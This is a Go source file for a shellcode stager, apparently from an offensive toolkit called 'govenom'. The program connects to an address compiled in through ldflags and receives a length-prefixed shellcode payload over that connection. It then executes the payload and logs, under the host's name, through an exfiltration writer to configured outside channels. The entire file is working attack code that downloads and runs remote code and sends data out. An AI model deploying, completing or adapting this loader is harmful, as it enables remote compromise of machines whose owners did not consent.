package main

import (
	"encoding/binary"
	"fmt"
	"govenom/exfilwriter"
	"io"
	"log"
	"net"
	"os"
	"time"
)

var (
	// set during compilation/linking via -X ldflag
	address      string
	network      string
	exfilCfg     string
	exfilTimeout string
)

func receiveShellcode(conn net.Conn) ([]byte, error) {
	sizeBuffer := make([]byte, 4)

	// read shellcode size
	_, err := conn.Read(sizeBuffer)
	if err != nil {
		return nil, fmt.Errorf("could not receive shellcode size: %v", err)
	}
	shellcodeSize := binary.LittleEndian.Uint32(sizeBuffer[:])
	fmt.Printf("shellcode size: %d\n", shellcodeSize)

	shellcodeBuffer := make([]byte, shellcodeSize)
	n, err := io.ReadFull(conn, shellcodeBuffer)
	if err != nil {
		return nil, fmt.Errorf("could not receive shellcode: %v", err)
	}
	// this is probably unneccessary with io.ReadFull
	if n != int(shellcodeSize) {
		return nil, fmt.Errorf("read wrong size %d should be %d", n, shellcodeSize)
	}

	return shellcodeBuffer, nil
}

func main() {
	timeout := 3 * time.Second
	if exfilTimeout != "" {
		dt, err := time.ParseDuration(exfilTimeout)
		if err == nil {
			timeout = dt
		}
	}

	w, errs := exfilwriter.New(exfilCfg, timeout)
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	log := log.New(w, fmt.Sprintf("%s: ", hostname), 0)

	conn, err := net.Dial(network, address)
	if err != nil {
		log.Fatalf("connecting to %s: %s\n", address, err)
	}

	w.AddExfiltrator(conn)
	// send out debuglog configuration errors *at least* over TCP
	if len(errs) > 0 {
		for _, err := range errs {
			log.Println(err)
		}
	}

	shcode, err := receiveShellcode(conn)
	if err != nil {
		log.Fatal(err)
	}
	log.Printf("received %d bytes of shellcode\n", len(shcode))
	err = execShellcode(shcode)
	if err != nil {
		log.Fatalf("shellcode execution failed: %v", err)
	}
}
